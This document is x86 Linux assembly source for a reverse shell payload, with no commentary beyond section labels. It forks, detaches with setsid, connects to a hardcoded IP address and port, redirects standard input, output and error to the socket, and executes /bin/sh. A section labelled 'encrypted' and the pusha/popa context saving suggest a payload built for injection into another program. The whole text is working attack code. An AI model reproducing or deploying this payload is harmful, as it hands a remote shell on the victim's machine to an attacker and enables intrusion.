global _start

%define SOCKETCALL 	102
%define READ  		3
%define WRITE 		4
%define EXIT		1
%define EXECV		11
%define DUP2		63	
%define FORK		2
%define SETSID		0x42
%define CLOSE		6
	
%define SYS_SOCKET 	1
%define SYS_CONNECT	3

%define AF_INET		2
%define SOCK_STREAM	1
%define IPPROTO_TCP	6

%define IP		0x76767676
%define PORT		0x9696

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; entry point		   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .text	
_start:
	pusha
	mov eax, FORK
	int 0x80
	cmp eax, 0
	jne .END
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; encrypted code          ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
section .encrypted	
.SETSID:
	mov eax, SETSID
	int 0x80
	
.SOCKET:
	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET

	mov ecx, esp
	mov ebx, SYS_SOCKET
	mov eax, SOCKETCALL
	int 0x80

	add esp, 12
	mov esi, eax
	cmp eax, -1
	je .END
	
.CONNECT:
	push IP
	push word PORT
	push word AF_INET
	mov eax, esp

	push 16
	push eax
	push esi

	mov ecx, esp
	mov ebx, SYS_CONNECT
	mov eax, SOCKETCALL
	int 0x80

	add esp, 20
	cmp eax, -1
	je .END
		
.DUP2:
	mov ebx, esi
	xor ecx, ecx
	xor eax, eax
	mov al, DUP2
	int 0x80

	inc ecx
	xor eax, eax
	mov al, DUP2
	int 0x80

	inc ecx
	xor eax, eax
	mov al, DUP2
	int 0x80
.EXECV:
	push 0
	push '//sh'
	push '/bin'
	mov ebx, esp

	push 0
	push ebx

	xor edx, edx
	mov ecx, esp
	mov eax, EXECV
	int 0x80

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; restore context   	   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .end	
.END:
	popa
